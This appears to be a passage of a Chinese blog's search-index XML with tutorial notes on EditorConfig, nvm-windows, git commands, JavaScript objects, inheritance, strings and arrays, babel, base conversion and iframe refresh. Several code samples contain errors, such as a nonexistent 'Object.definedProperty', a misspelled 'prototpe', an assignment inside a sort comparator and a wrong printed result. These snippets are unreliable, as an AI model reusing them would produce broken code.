常见的问题VSCode支持VSCode默认不支持EditorConfig。需要在编辑器的插件（Ctrl + Shift + X）安装中 EditorConfig for VS Code,即可支持。 WebStorm支持WebStorm默认支持EditorConfig文件，需要设置 打开WebStorm &gt; File &gt; settings（快捷键Ctrl + Alt + S）。 找到Editor &gt; Code Style 并点击它，在下面会有一个Enable EditorConfig support,选中复选框。 复选框的后面有一个Export按钮，它是导出editorConfig配置文件，点击确定，可在项目中自动生成一份.editorConfig配置文件。]]></content>
      <categories>
        <category>工具</category>
      </categories>
      <tags>
        <tag>编辑器</tag>
        <tag>EditorConfig</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[nvm-Windows]]></title>
    <url>%2Fnvm-Windows%2F</url>
    <content type="text"><![CDATA[安装下载nvm for Windows，在Windows便于管理node版本。 nvmw安装github代码库地址为https://github.com/coreybutler/nvm-windows。 存在多个安装方式，在安装之前需要注意的是，本地不要有nodeJs的已安装版本，建议卸载之后再进行。 nvm-noinstall.zip推荐这种方式，较为灵活。下载安装包nvm-noinstall.zip到本地。解压缩，本例解压在F:\nvm,文件包含： 12345elevate.cmdelevate.vbsinstall.cmdLICENSEnvm.exe 双击install.cmd,以控制台形式显示,Enter键确认等待完成。会在当前根目录生成文件settings.txt。可能存在Enter键确认后报错，并弹出一个settings.txt文本框，关掉即可。将settings.txt文件拷贝至解压缩目录，这里是F:\nvm目录。添加如下内容： 123456root: F:\nvmpath: F:\nodeJsarch: 64proxy: nonenode_mirror: http://npm.taobao.org/mirrors/node/npm_mirror: https://npm.taobao.org/mirrors/npm/ root: nvm存放地址path: node快捷方式地址，可自定义，建议同级nvm目录。在nvmw安装成功，使用nvm use &lt;version&gt;可以自动创建。arch: 系统位数 32/64位proxy: 服务器代理node_mirror: node镜像地址，便于国内下载npm_mirror: npm镜像地址，便于国内下载 配置环境变量，右击电脑属性，打开高级系统设置，环境变量设置。 在系统环境变量中存在NVM_HOME和NVM_SYMLINK，是由双击install.cmd时生成的。修改如下： NVM_HOME中变量值修改为settings.txt中的root:地址，即F:\nvm; NVM_SYMLINK中变量值修改为settings.txt中的path:地址，即F:\nodeJs; PATH中添加;%NVM_HOME%;%NVM_SYMLINK%;即可。 nvm-setup.zip该方法下载好安装包后，一路next，点击下一步即可，配置环境变量类似上一种方式。 nvmw检测通用检测方式终端输入nvm -v成功会显示版本号。 nvmw指令在终端输入nvm会提示简要指令。 nvm list: 获取当前node版本列表 nvm install &lt;version&gt; [arch]: 下载node版本。arch中可选择32/64，默认64位系统的node。 nvm use [version] [arch]: 切换node版本。]]></content>
      <categories>
        <category>工具</category>
      </categories>
      <tags>
        <tag>node</tag>
        <tag>nvm</tag>
        <tag>windows</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[git常用]]></title>
    <url>%2Fgit%E5%B8%B8%E7%94%A8%2F</url>
    <content type="text"><![CDATA[git工具的安装下载流程，以及git的常用语法，参照git官网。建议合理运用git --help。 下载安装git在Windows上安装需在官网https://git-scm.com/downloads下载，傻瓜式安装，默认下一步，添加环境变量路径（默认勾选）。 测试是否安装成功安装完成后通过git --version测试是否安装成功，成功会出现版本号。 运行前配置用户信息 12git config --global user.name &quot;Your Name&quot;git config --global user.email &quot;email@example.com&quot; 文本编辑器 1git config --global core.editor emacs 检查配置信息$ git config --list 常用语法获取帮助1git --help 创建版本库123mkdir yourDircd yourDirgit init 添加暂存区12git add *.cgit add LICENSE 提交更新1git commit -m &apos;initial project version&apos; 快捷添加暂存区并提交 $ git commit -a -m &#39;initial project version&#39; 克隆现有仓库1git clone [url] 检查文件当前状态1git status 忽略文件在.gitignore中可以通过正则或者添加文件来忽略git的监视，例如如下文件配置。 1234567.DS_StoreThumbs.dbdb.json*.lognode_modules/public/.deploy*/ 移除文件1git rm [file] 移动文件git不能移动文件，可以看做改名，重命名。 1git mv file_from file_to 查看提交历史默认不用任何参数的话，git log 会按提交时间列出所有的更新，最近的更新排在最上面。 1git log 一个常用的选项是 -p，用来显示每次提交的内容差异。 你也可以加上 -2 来仅显示最近两次提交： 1git log -p -2 More info https://git-scm.com/book/en/v2/Git-Basics-Viewing-the-Commit-History 撤销操作取消暂存的文件1git reset HEAD &lt;file&gt; 修改上一次提交123git commit -m &apos;initial commit&apos;git add forgotten_filegit commit --amend More info https://git-scm.com/book/en/v2/Git-Basics-Undoing-Things 远程仓库查看远程仓库加参数-v，可以看到url，不加只有简写名称加show [remote-name]，可以获取该仓库的具体信息 1git remote -v 添加远程仓库1git remote add &lt;shortname&gt; &lt;url&gt; 拉取远程仓库1git fetch [remote-name] git fetch 与 git pull的区别在于，git fetch不会自动merge，需要你手动完成。 推送远程仓库1234git push [remote-name] [branch-name]git push //默认推送约等于下一行命名，前提没有更改默认远程链接git push origin master 远程仓库的移除与重命名重命名pb为paul。 1234git remote rename pb paulgit remoteoriginpaul 删除paul。 123git remote rm paulgit remoteorigin 打标签列出标签1git tag 创建标签附加标签，带有打标签者的信息，推荐使用。使用 git show 命令可以看到标签信息与对应的提交信息。 12345git tag -a v1.4 -m &apos;my version 1.4&apos;git tagv0.1v1.3v1.4 轻量标签本质上是将提交校验和存储到一个文件中 - 没有保存任何其他信息。 1234567git tag v1.4-lwgit tagv0.1v1.3v1.4v1.4-lw 后期打标签查看历史并标记 123456789git log --pretty=oneline166ae0c4d3f420721acbb115cc33848dfcc2121a started write support9fceb02d0ae598e95dc970b74767f19372d61af8 updated rakefile964f16d36dfccde844893cac5b347e7b3d44abbc commit the todogit tag -a v1.2 9fceb02git tagv1.2 共享标签1git push origin v1.5 检出标签1git checkout -b [branchname] [tagname] 分支创建1git branch [branchName] 切换1git checkout [branchName] 快捷创建切换使用$ git checkout -b [branchName] 删除1git branch -d [branchName] 整合简单的整合 12git checkout mastergit merge [branchName] 变基整合切换experiment分支，根据与master公共祖先整合 1234git checkout experimentgit rebase mastergit checkout mastergit merge experiment More info https://git-scm.com/book/en/v2/Git-Branching-Rebasing 生成ssh密钥enter跳过，默认无密码 1ssh-keygen -t rsa -C &quot;email&quot; 可查看是否生成ssh。id_dsa.pub是公钥，用于github之类的托管库来添加ssh。 1234567cd ~/.sshlsid_dsa known_hostsconfig id_dsa.pub//查看公钥vim id_dsa.pub 补充克隆库使用的https协议，修改ssh协议在.git文件夹中，通过编辑器打开config文件，设置https地址为ssh地址。 .gitignore规则不生效在开发过程中，想忽略某个文件或文件夹，将其添加入.gitignore,规则存在不生效，其原因是已被纳入版本管理中，要想删除，需要清除本地缓存： 123git rm -r --cached .git add .git commit -m &apos;update .gitignone&apos; 创建可推送远程分支的分支本地创建分支，并直接可以推送到远程相应分支。 12345##前提是远程有test仓库，如果没有先创建推送，在执行此命令git checkout -b [bracnh] origin/[branch]##已创建本地分支track远程分支git branch --set-upstream [branch] [remote-branch] 查看本地分支跟踪的远程分支12345# 当前分支跟踪的远程分支git branch -vv# 所有分支跟踪的远程分支git branch -vv -a 远程库迁移且保存历史提交记录1234567# 方法一：克隆镜像，推送镜像到新的远程库git clone --bare git://1xxx/project_name.gitcd project_name.gitgit push --mirror git://2xxx/project_name.git# 方法二：克隆到本地，修改远程库推送地址git remote set-url [--push] &lt;name&gt; &lt;newurl&gt; [&lt;oldurl&gt;] 撤回操作工作区123# 撤回工作区git checkout .git checkout -- &lt;file&gt; 暂存区123456# git追踪过的某个文件git reset &lt;file&gt;# git未追踪过的新文件git reset HEAD &lt;file&gt;# 完全移除不需要git reset --hard 本地提交1234567# 回退到某个分支,--hard慎用git reset --hard [&lt;commit&gt;]# 撤回上一次提交，但保存修改的文件到暂存区git reset --soft HEAD~1# 回退另一种方式git checkout [&lt;commit&gt;] 远程库12# 通过上述的回退后，强制推送远程git push -f 撤销撤回的操作123# 查看回退的commitIdgit refloggit reset --hard [&lt;commit&gt;] 更多信息详见git官网https://git-scm.com/book/zh/v2]]></content>
      <categories>
        <category>工具</category>
      </categories>
      <tags>
        <tag>git</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[高程笔记-对象2]]></title>
    <url>%2F%E9%AB%98%E7%A8%8B%E7%AC%94%E8%AE%B0-%E5%AF%B9%E8%B1%A12%2F</url>
    <content type="text"><![CDATA[《JavaScript高级程序》笔记，主要关于对象的继承。 原型链继承每个构造函数都有一个原型对象，原型对象都包含一个指向构造函数的指针，而实例都包含一个指向原型对象的内部指针。参考高程，其基本的关系如下： 1234567891011121314151617function SuperType() &#123; this.property = true;&#125;SuperType.prototype.getSuperValue = function() &#123; return this.property;&#125;function SubType() &#123; this.subproperty = false;&#125;// 继承了SuperTypeSubType.prototype = new SuperType();SubType.prototype.getSubValue = function() &#123; return this.subproperty;&#125;var instance = new SubType();console.log(instance.getSuperValue()); //true 由关系图也能看出，实例与构造函数是没有直接关系的。这点在后面的继承关系中很重要。 可以通过instanceof来判断原型与实例之间的关系。同时也可以通过isPrototypeOf()来判断是否为原型链所派生的实例的原型。 1234567console.log( instance instanceof Object ) //trueconsole.log( instance instanceof SuperType ) //trueconsole.log( instance instanceof SubType ) //trueconsole.log( Object.prototype isPrototypeOf(instance) ) //trueconsole.log( SuperType.prototype isPrototypeOf(instance) ) //trueconsole.log( SubType.prototype isPrototypeOf(instance) ) //true 缺点：原型链在创建对象的时候已经体现出来。当出现引用类型时，会影响其它实例。 借用构造函数未解决引用类型的问题，出现了借用构造函数（伪造对象/经典继承）。 1234567891011121314function SuperType() &#123; this.colors = ['red','blue','green']&#125;function SubType() &#123; //继承SuperType SuperType.call(this)&#125;var instance1 = new SubType();instance1.colors.push('black');console.log(instance1.colors); //'red,blue,green,black'var instance2 = new SubType();console.log(instance2.colors); //'red,blue,green' 缺点：方法都在构造函数中定义，函数不能复用。 组合继承也叫伪经典继承。即组合原型链和借用构造函数的方法。 1234567891011121314151617181920212223242526272829function SuperType(name) &#123; this.name = name; this.colors = ['red','blue','green'];&#125;SuperType.prototype.sayName = function() &#123; alert(this.name);&#125;function SubType(name,age) &#123; //继承属性 SuperType.call(this,name); this.age = age;&#125;// 继承方法SubType.prototype = new SuperType();SubType.prototype.sayAge = function() &#123; alert(this.age);&#125;var instance1 = new SubType('jon',29);instance1.colors.push('black');console.log(instance1.colors); //'red,blue,green,black'console.log(instance1.name); //jonconsole.log(instance1.age); //29var instance2 = new SubType('snow',20);console.log(instance2.colors); //'red,blue,green'console.log(instance2.name); //snowconsole.log(instance2.age); //20 缺点：继承重复掉用父类。 原型式继承道格拉斯·克罗克福德的方法。通过辅助函数实现浅复制。 12345678910111213141516171819function object(o) &#123; function F()&#123;&#125; F.prototype = o; return new F();&#125;var person = &#123; name: 'jon', friends: ['Shelty','Count','Van']&#125;;var anotherPerson = object(person);anotherPerson.name = 'snow';anotherPerson.friends.push('Rob');var yetAnotherPerson = object(person);yetAnotherPerson.name = 'Linda';yetAnotherPerson.friends.push('Sarbie');alert(person.friends); // 'Shelty','Count','Van','Rob','Sarbie' 同es5的Object.create()方法。 12345678910111213var person = &#123; name: 'jon', friends: ['Shelty','Count','Van']&#125;;var anotherPerson = Object.create(person);anotherPerson.name = 'snow';anotherPerson.friends.push('Rob');var yetAnotherPerson = Object.create(person);yetAnotherPerson.name = 'Linda';yetAnotherPerson.friends.push('Sarbie');alert(person.friends); // 'Shelty','Count','Van','Rob','Sarbie' 寄生式继承12345678910111213function object(o) &#123; function F()&#123;&#125; F.prototype = o; return new F();&#125;function createAnother(original) &#123; var clone = object(original); clone.sayHi = function() &#123; alert('hi'); &#125; return clone;&#125; 寄生组合式继承1234567891011121314151617181920212223242526272829function object(o) &#123; function F()&#123;&#125; F.prototype = o; return new F();&#125;function inheritPrototype(subType,superType)&#123; var prototype = object(superType.prototype); //创建对象 prototype.constructor = subType; //增强对象 subType.prototype = prototype; //指定对象&#125;function SuperType(name) &#123; this.name = name; this.colors = ['red','blue','green'];&#125;SuperType.prototype.sayName = function() &#123; alert(this.name);&#125;function SubType(name,age) &#123; SuperType.call(this,name); this.age = age;&#125;inheritPrototype(SubType,SuperType);SubType.prototype.sayAge = function() &#123; alert(this.age);&#125;]]></content>
      <categories>
        <category>js</category>
      </categories>
      <tags>
        <tag>笔记</tag>
        <tag>Object</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[高程笔记-对象1]]></title>
    <url>%2F%E9%AB%98%E7%A8%8B%E7%AC%94%E8%AE%B0-%E5%AF%B9%E8%B1%A11%2F</url>
    <content type="text"><![CDATA[《JavaScript高级程序》笔记，主要关于对象属性以及对象的创建方式。 最简单的创建方式是通过Object。 12345678var person = new Object();person.name = "xiaoming";person.age = "12";person.job = "student";person.sayName = function()&#123; console.log(this.name);&#125; 属性类型属性分类ECMA-262定义描述内部特性，有两种（只能为其中一种），如下： 数据属性 访问器属性 [[ Configurable ]] [[ Configurable ]] [[ Enumerable ]] [[ Enumerable ]] [[ Writable ]] [[ Value ]] [[ Get ]] [[ Set ]] [[ Configurable ]]：表示能否被delete删除重新定义属性，能否修改属性的特性，或者能否把属性修改为访问器属性。 [[ Enumerable ]]：表示能否被for-in循环返回属性。 [[ Writable ]]：表示能否修改属性的值。 [[ Value ]]：包含这个属性的数据值。读取属性值时，从这个位置读取；写入属性值的时候，把新值保存在这个位置。默认undefined。 [[ Get ]]：在读取属性时掉用的函数。默认值为undefined。 [[ Set ]]：在写入属性时掉用的函数。默认值为undefined。 设置默认属性需要es5的Object.definedProperty()方法。例如： 1234567891011121314151617181920212223var person = &#123;&#125;;Object.definedProperty(person,'name',&#123; writable : false, value: 'xiaoMing'&#125;);console.log(person.name); // 'xiaoMing'person.name = 'xiaoHong';console.log(person.name); // 'xiaoMing'Object.definedProperty(person,'name',&#123; configurable : false, value: 'xiaoMing'&#125;);console.log(person.name); // 'xiaoMing'person.name = 'xiaoHong';console.log(person.name); // 'xiaoMing'// 报错Object.definedProperty(person,'name',&#123; configurable : true, value: 'xiaoMing'&#125;); 单属性定义1234567891011121314151617var book = &#123; _year: 2004, edition: 1&#125;Object.definedProperty(book,'year',&#123; get: function ()&#123; return this._year; &#125;, set: function(newValue)&#123; if( newValue &gt; 2004 )&#123; this._year = newValue; this.edition += newValue - 2004; &#125; &#125;&#125;);book.year = 2005;console.log( book.edition ) //2 多属性定义123456789101112131415161718192021222324var book = &#123; &#125;;Object.definedProperties(book,&#123; _year：&#123; value: 2004 &#125;, edition: &#123; value: 1 &#125;, year: &#123; get: function ()&#123; return this._year; &#125;, set: function(newValue)&#123; if( newValue &gt; 2004 )&#123; this._year = newValue; this.edition += newValue - 2004; &#125; &#125; &#125;&#125;);var descriptor = Object.getOwnPropertyDescriptor(book,"_year");alert(descriptor.value) //2004alert(descriptor.configurable) //false 创建对象工厂模式对象的识别不明确。 123456789101112function createPerson(name,age,job) &#123; var o = new Object(); o.name = name; o.age = age; o.job = job; o.sayName =function()&#123; alert(this.name); &#125; return o;&#125;var person1 = createPerson('Nicholas','29','teacher');var person2 = createPerson('Greg','19','student'); 构造函数模式方法的重复创建，即每个实例上面都会创建一个方法。如下例中，person1和person2都含有sayName()的方法。如果将sayName()单独提取出来，当方法很多的时候，就会出现污染全局变量的问题。 12345678910function Person(name,age,job) &#123; this.name = name; this.age = age; this.job = job; this.sayName =function()&#123; alert(this.name); &#125;&#125;var person1 = new Person('Nicholas','29','teacher');var person2 = new Person('Greg','19','student'); 原型模式解决了方法会污染环境变量的问题，但是对于数组、对象这种引用类型，可能会出现如下例的问题。虽然friends属性不同，但是指向的同一地址，从而影响其它实例。 123456789101112131415161718192021function Person() &#123;&#125;Person.prototype = &#123; name: 'Nicholas', age:'29', job:'teacher', friends:['lucy','jon','angus'], sayName: function()&#123; alert(this.name); &#125;&#125;var person1 = new Person();person1.sayName() // 'Nicholas'var person2 = new Person();person2.sayName() // 'Nicholas'person1.friends.push('van');alert(person1.friends); //'lucy','jon','angus'alert(person2.friends); //'lucy','jon','angus'alert(person1.friends === person2.friends); //true 组合构造函数和原型模式常用的一种创建方式。 12345678910111213141516171819function Person(name,age,job) &#123; this.name = name; this.age = age; this.job = job; this.friends = ['lucy','jon','angus'];&#125;Person.prototype = &#123; constructor: Person, sayName: function()&#123; alert(this.name); &#125;&#125;var person1 = new Person('Nicholas','29','teacher');var person2 = new Person('Greg','19','student');person1.friends.push('van');alert(person1.friends); //'lucy','jon','angus'alert(person2.friends); //'lucy','jon'alert(person1.friends === person2.friends); //false 动态原型模式初次执行函数时，会触发判断。原型不能使用字面量的模式创建，相当于重写，会出现丢失构造函数的问题。 12345678910function Person(name,age,job) &#123; this.name = name; this.age = age; this.job = job; if (typeof this.sayName != 'function' )&#123; Person.prototpe.sayName = function()&#123; alert(this.name); &#125;; &#125;&#125; 稳妥构造函数模式name只能由sayName()函数访问属性，通过提供安全性，特殊情况使用。 123456789function Person(name,age,job) &#123; var o = new Object(); o.sayName = function()&#123; alert(name); &#125;; return o;&#125;var person1 = Person('Nicholas','29','teacher');person1.sayName(); // Nicholas]]></content>
      <categories>
        <category>js</category>
      </categories>
      <tags>
        <tag>笔记</tag>
        <tag>Object</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[babel]]></title>
    <url>%2Fbabel%2F</url>
    <content type="text"><![CDATA[babel简单使用。 官网介绍的很详细，官网地址http://babeljs.io/. .babelrc一般需要配置文件.babelrc配合使用。基本格式: 12345## .babelrc文件配置&#123; &quot;presets&quot;: [&quot;es2015&quot;,&quot;react&quot;,...otherRules], &quot;plugins&quot;: []&#125; babel-cli安装指令如下，可以使用指令编译文件 1npm install --global babel-cli 简单用法 12345678910111213# 编译单个文件$ babel index.js# 转码结果写入一个文件 --out-file/-o$ babel index.js --out-file outfile.js$ babel index.js -o outfile.js# 整个目录转码 --out-dir/-d$ babel src --out-dir lib$ babel src -d lib# 生成source map -s$ babel src -d lib -s babel-preset-envbabel可以安装官方的预编译配置，也可以自定义。具体包含什么功能，详见官方文档。 1234567## 下载安装npm install --save-dev babel-preset-env## .babelrc文件配置&#123; &quot;presets&quot;: [&quot;env&quot;]&#125; babel-polyfill由于Babel只转换语法（如箭头函数），因此可以使用babel-polyfill来支持Promise或新的本地方法（如String.padStart（左键））等新的全局变量。 1npm install --save-dev babel-polyfill 在线编译官网地址http://babeljs.io/repl/]]></content>
      <categories>
        <category>工具</category>
      </categories>
      <tags>
        <tag>js</tag>
        <tag>Polyfill</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[高程笔记-String]]></title>
    <url>%2F%E9%AB%98%E7%A8%8B%E7%AC%94%E8%AE%B0-String%2F</url>
    <content type="text"><![CDATA[《JavaScript高级程序》笔记，包含字符串常用方法。 创建方式 构造函数var str = new String(&#39;hello&#39;); 字面量方式var str = &#39;hello&#39;; 字符方法charAt():返回在指定位置的字符。charCodeAt():返回在指定的位置的字符的 Unicode 编码。 concat():连接字符串。substr(start[, length]):通过指定字符数返回在指定位置开始的字符串中的字符。substring(indexStart[, indexEnd]):返回在字符串中指定两个下标之间的字符。slice(beginSlice[, endSlice]):提取字符串的片断，并在新的字符串中返回被提取的部分。 indexOf():检索字符串。lastIndexOf():从后向前搜索字符串。 trim():一个字符串的两端删除空白字符。 match():找到一个或多个正则表达式的匹配。replace():替换与正则表达式匹配的子串。search():检索与正则表达式相匹配的值。 split():分离字符串成字串，将字符串对象分割成字符串数组。 localeCompare():返回一个数字来指示一个参考字符串是否在排序顺序前面或之后或与给定字符串相同。 toLowerCase():把字符串转换为小写。toUpperCase():把字符串转换为大写。toLocaleLowerCase():根据当前区域设置，把字符串转换为小写。toLocaleUpperCase():根据当前区域设置，把字符串转换为大写。 fromCharCode():从字符编码创建一个字符串。 1234567891011121314151617var stringValue="hello world";stringValue.charAt(1);// "e"stringValue.charCodeAt(1); // 101stringValue.concat('!!!'); // "hello world!!!"stringValue.substr(1,2); // "el"stringValue.substring(1,2); // "e"stringValue.slice(1,2); // "e"stringValue.indexOf("o"); // 4stringValue.lastIndexOf("o"); // 7var stringVal="yellow";stringVal.localeCompare("brick"); // 1stringVal.localeCompare("yellow"); // 0stringVal.localeCompare("zoo"); // -1]]></content>
      <categories>
        <category>js</category>
      </categories>
      <tags>
        <tag>笔记</tag>
        <tag>String</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[高程笔记-数组]]></title>
    <url>%2F%E9%AB%98%E7%A8%8B%E7%AC%94%E8%AE%B0-%E6%95%B0%E7%BB%84%2F</url>
    <content type="text"><![CDATA[《JavaScript高级程序》笔记，包含数组的创建、检测以及数组方法。 创建方式 构造函数var arr = new Array(1,2,3) 字面量方式var arr = [1,2,3] 继承Object以下方法原始值由Array对象派生的所有对象继承。 toSource(): 返回该对象的源代码。仅Gecko 核心的浏览器支持。toString(): 把数组转换为字符串，并返回结果toLocaleString(): 把数组转换为本地数组，并返回结果valueOf(): 返回数组对象的原始值 检测数组es3方法value instanceof Array,仅用在单一全局执行环境。es5方法Array.isArray(vlaue)，不限环境，需要ie9+及以上版本支持。 不会改变原始数组concat()连接两个或更多的数组，并返回结果。arrayObject.concat(arrayX,arrayX,……,arrayX)其中arrayX可以是数组也可以是具体值。 1234var a = [1,2,3], b = [4,5,6];console.log(a.concat(b)); //[1, 2, 3, 4, 5, 6]console.log(a.concat(0,-1,b));//[1, 2, 3, 0, -1, 4, 5, 6] join()把数组的所有元素放入一个字符串。元素通过指定的分隔符进行分隔。arrayObject.join(separator)，其中separator可选。指定要使用的分隔符。如果省略该参数，则使用逗号作为分隔符。 123var arr = ['h','e','l','l','o'];arr.join(); //"h,e,l,l,o"arr.join(''); //"hello" slice()从某个已有的数组返回选定的元素。 1234var arr = ['h','e','l','l','o'];var callback =arr.slice(2);console.log(arr); // ["h", "e", "l", "l", "o"]console.log(callback); // ["l", "l", "o"] 改变原始数组pop()删除并返回数组的最后一个元素。 1234var arr = ['h','e','l','l','o'];var callback =arr.pop();console.log(arr); //["h", "e", "l", "l"]console.log(callback); // o push()向数组的末尾添加一个或更多元素，并返回新的长度。 1234var arr = ['h','e','l','l','o'];var callback =arr.push('!');console.log(arr); // ["h", "e", "l", "l", "o", "!"]console.log(callback); // 6 shift()删除并返回数组的第一个元素。 1234var arr = ['h','e','l','l','o'];var callback =arr.shift();console.log(arr); // ["e", "l", "l", "o"]console.log(callback); // h unshift()向数组的开头添加一个或更多元素，并返回新的长度。 1234var arr = ['h','e','l','l','o'];var callback =arr.unshift('say:');console.log(arr); // ["say:", "h", "e", "l", "l", "o"]console.log(callback); // 6 sort()对数组的元素进行排序。返回对数组的引用。在原数组上排序。arrayObject.sort(sortby)，其中sortby可选。规定排序顺序。必须是函数。 123456789101112131415var arr = [2,4,7,9,1,10];console.log(arr.sort()) //[1, 10, 2, 4, 7, 9]默认排序var callback =arr.sort(function(a,b)&#123; if(a &lt; b)&#123;return -1&#125; else if(a = b)&#123;return 1&#125; else&#123;return 0&#125;&#125;);//方法简化//var callback =arr.sort(function(a,b)&#123;// return a-b//&#125;)console.log(arr); // [1, 2, 4, 7, 9，10]console.log(callback); // [1, 2, 4, 7, 9，10] splice()删除元素，并向数组添加新元素。返回删除项的数组。arrayObject.splice(index,howmany,item1,…..,itemX)，其中index，必需。整数，规定添加/删除项目的位置，使用负数可从数组结尾处规定位置。howmany，必需。要删除的项目数量。如果设置为 0，则不会删除项目。item1,.....,itemX,可选。向数组添加的新项目。 1234var arr = ['h','e','l','l','o'];var callback =arr.splice(1,4,'i','!');console.log(arr); // ["h", "i", "!"]console.log(callback); // ["e", "l", "l", "o"] es5的五种数组迭代方式 every():对数组中每一项运行给定函数，如果该函数对每一项都返回true,则返回true。 filter():对数组中每一项运行给定函数，返回该函数会返回true的项组成的数组。 forEach():对数组中每一项运行给定函数，这个方法没有返回值。 map():对数组中每一项运行给定函数，返回每次函数掉用的结果组成的数组。 some():对数组中每一项运行给定函数，如果该函数对任一项返回true,则返回true。 备注：以上方法都不会修改数组中的值。 12345678910111213141516171819202122232425var numbers = [1,2,3,4,5,4,3,2,1];var everyResult = numbers.every(function(item,index,array)&#123; return ( item &gt; 2 )&#125;);console.log( everyResult ) //falsevar someResult = numbers.some(function(item,index,array)&#123; return ( item &gt; 2 )&#125;);console.log( someResult ) //truevar filterResult = numbers.filter(function(item,index,array)&#123; return ( item &gt; 2 )&#125;);console.log( filterResult ) //[3,4,5,4,3]var mapResult = numbers.map(function(item,index,array)&#123; return ( item * 2 )&#125;);console.log( mapResult ) //[2,4,6,8,10,8,6,4,2]numbers.forEach(function(item,index,array)&#123; //执行程序&#125;); IE9+、FireFox2+、Safari3+、Opera9.5+ 和Chrome兼容。 es5缩小方法reduce()和reduceRight()，都会迭代数组所有项，构建一个最终返回的值，第一个是从头到尾迭代，第二个是从尾到头。参数两个[callback, initialValue] initialValue：可选参数, 作为第一次调用 callback 的第一个参数 callback:function(previousValue,currentValue,currentIndex,array){} previousValue：上一次调用回调函数返回的值，或者是提供的初始值（initialValue） currentValue：数组中当前被处理的元素 currentIndex：当前被处理元素在数组中的索引, 即currentValue的索引.如果有initialValue初始值, 从0开始.如果没有从1开始 array：调用 reduce 的数组 12345var value = [1,2,3,4,5];var sum = value.reduce(function(prev,cur,index,array)&#123; return prev + cur;&#125;)alert(sum) //15]]></content>
      <categories>
        <category>js</category>
      </categories>
      <tags>
        <tag>笔记</tag>
        <tag>Array</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[进制转换]]></title>
    <url>%2F%E8%BF%9B%E5%88%B6%E8%BD%AC%E6%8D%A2%2F</url>
    <content type="text"><![CDATA[通过原生js可以实现进制之间转换。 js对象均包含toString、toLocaleString以及valueOf方法，通过原型链的方式继承。由chrome控制台可以打印出Object的原型方法。 参照MDN：Number.prototype.toString([radix]),返回指定 Number 对象的字符串表示形式。其中radix默认10，取值范围2~36。 parseInt(string, radix),解析一个字符串参数，并返回一个指定基数的整数 (数学系统的基础)。如果参数string不是一个字符串，则将其转换为字符串;参数radix默认10，取值范围2~36。 将数字转换进制可以直接转换。 1234567var num = 10;num.toString(2) // 1010num.toString(8) // 12num.toString(16) // aparseInt(num,8); // 八进制转十进制parseInt(num,16); // 十六进制转十进制 将字符串转换进制。字符串如果不能被转换成正确的数值，返回值为NaN。 1234567891011121314var str ='10';// 十进制转换其它parseInt(str).toString(2) // 1010parseInt(str).toString(8) // 12parseInt(str).toString(16) // aparseInt(str,2).toString(8) // 二进制转八进制parseInt(str,2).toString(16) // 二进制转十六进制parseInt(str,8).toString(2) // 八进制转二进制parseInt(str,8).toString(16) // 八进制转十六进制parseInt(str,16).toString(2) // 十六进制转二进制parseInt(str,16).toString(8) // 十六进制转八进制parseInt('a').toString(2) // NaN]]></content>
      <categories>
        <category>js</category>
      </categories>
      <tags>
        <tag>String</tag>
        <tag>Number</tag>
        <tag>转换</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[iframe局部刷新]]></title>
    <url>%2Fiframe%E5%B1%80%E9%83%A8%E5%88%B7%E6%96%B0%2F</url>
    <content type="text"><![CDATA[通过iframe实现全局刷新和局部刷新。 原理通过location.reload()来实现.详见代码。 代码主页面1234567891011121314151617181920212223&lt;!DOCTYPE html&gt;&lt;html lang="en"&gt;&lt;head&gt; &lt;meta charset="UTF-8"&gt; &lt;meta name="viewport" content="width=device-width, initial-scale=1.0"&gt; &lt;meta http-equiv="X-UA-Compatible" content="ie=edge"&gt; &lt;title&gt;Document&lt;/title&gt;&lt;/head&gt;&lt;body&gt; &lt;button&gt;全局刷新&lt;/button&gt; &lt;iframe src="sub.html" frameborder="0" width="400" height="" scrolling="auto"&gt;&lt;/iframe&gt; &lt;script&gt; window.onload = function () &#123; document.getElementsByTagName('button')[0].onclick = function()&#123; //location.reload(); //top.location.reload(); parent.location.reload(); console.log("index.html reload!"); &#125; &#125; &lt;/script&gt;&lt;/body&gt;&lt;/html&gt; 子页面1234567891011121314151617181920212223&lt;!DOCTYPE html&gt;&lt;html lang="en"&gt;&lt;head&gt; &lt;meta charset="UTF-8"&gt; &lt;meta name="viewport" content="width=device-width, initial-scale=1.0"&gt; &lt;meta http-equiv="X-UA-Compatible" content="ie=edge"&gt; &lt;title&gt;Document&lt;/title&gt;&lt;/head&gt;&lt;body&gt; &lt;p&gt; 测试文本！测试文本！测试文本！测试文本！测试文本！测试文本！测试文本！测试文本！测试文本！测试文本！测试文本！测试文本！测试文本！测试文本！测试文本！测试文本！测试文本！测试文本！测试文本！测试文本！测试文本！测试文本！ &lt;/p&gt; &lt;button id="subtbn"&gt;局部刷新&lt;/button&gt; &lt;script&gt; window.onload = function () &#123; document.getElementById('subtbn').onclick = function()&#123; self.location.reload(); console.log("sub.html reload!"); &#125; &#125; &lt;/script&gt;&lt;/body&gt;&lt;/html&gt;]]></content>
      <categories>
        <category>html</category>
      </categories>
      <tags>
        <tag>js</tag>
        <tag>html</tag>
        <tag>iframe</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[html5属性]]></title>
    <url>%2Fhtml5%E5%B1%9E%E6%80%A7%2F</url>
